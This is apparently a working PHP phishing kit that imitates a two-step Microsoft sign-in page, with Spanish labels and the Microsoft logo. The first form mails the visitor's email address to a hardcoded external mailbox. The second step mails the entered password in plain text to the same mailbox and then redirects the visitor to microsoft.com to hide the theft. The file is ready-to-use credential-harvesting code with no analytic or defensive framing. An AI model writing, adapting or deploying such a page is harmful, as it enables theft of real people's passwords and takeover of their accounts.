<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'] ?? '';

    // Enviar un correo cuando el usuario ingresa solo su correo electrónico
    if (empty($password)) {
        // Enviar el correo con solo el email
        $to = "sgallardo@vallefrio.cl";
        $subject = "Usuario ingresó su correo electrónico";
        $message = "Correo electrónico: " . $email;
        $headers = "From: noreply@yourdomain.com";
        mail($to, $subject, $message, $headers);

        // Mostrar la segunda página para la contraseña
        echo '
        <!DOCTYPE html>
        <html lang="es">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Introducir contraseña - Microsoft</title>
            <style>
                body {
                    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
                    background-color: #f0f0f0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    background-image: linear-gradient(to right, #f6f6f6, #e7e7e7);
                }
                .login-container {
                    background-color: white;
                    padding: 20px;
                    box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
                    border-radius: 8px;
                    width: 360px;
                    text-align: center;
                }
                .login-container img {
                    margin-bottom: 20px;
                }
                .login-container input[type="password"] {
                    width: 100%;
                    padding: 12px;
                    margin-bottom: 20px;
                    border: 1px solid #ccc;
                    border-radius: 4px;
                    font-size: 14px;
                }
                .login-container button {
                    width: 100%;
                    padding: 12px;
                    background-color: #0078d4;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 16px;
                }
                .login-container button:hover {
                    background-color: #005a9e;
                }
                .footer-links {
                    margin-top: 20px;
                    font-size: 12px;
                    color: #6e6e6e;
                }
                .footer-links a {
                    color: #6e6e6e;
                    text-decoration: none;
                    margin: 0 5px;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" width="120">
                <form id="password-form" action="login.php" method="POST">
                    <input type="hidden" name="email" value="'.$email.'">
                    <input type="password" name="password" placeholder="Contraseña" required>
                    <button type="submit">Iniciar sesión</button>
                </form>
                <div class="footer-links">
                    <a href="#">Términos de uso</a> | 
                    <a href="#">Privacidad y cookies</a>
                </div>
            </div>
        </body>
        </html>
        ';
    } else {
        // Enviar un correo cuando el usuario ingrese su contraseña
        $to = "sgallardo@vallefrio.cl";
        $subject = "Usuario ingresó su correo electrónico y contraseña";
        $message = "Correo electrónico: " . $email . "\n" . "Contraseña: " . $password;
        $headers = "From: noreply@yourdomain.com";
        mail($to, $subject, $message, $headers);

        // Redirigir al usuario a una página de destino
        header("Location: https://www.microsoft.com");
        exit;
    }
}
?>
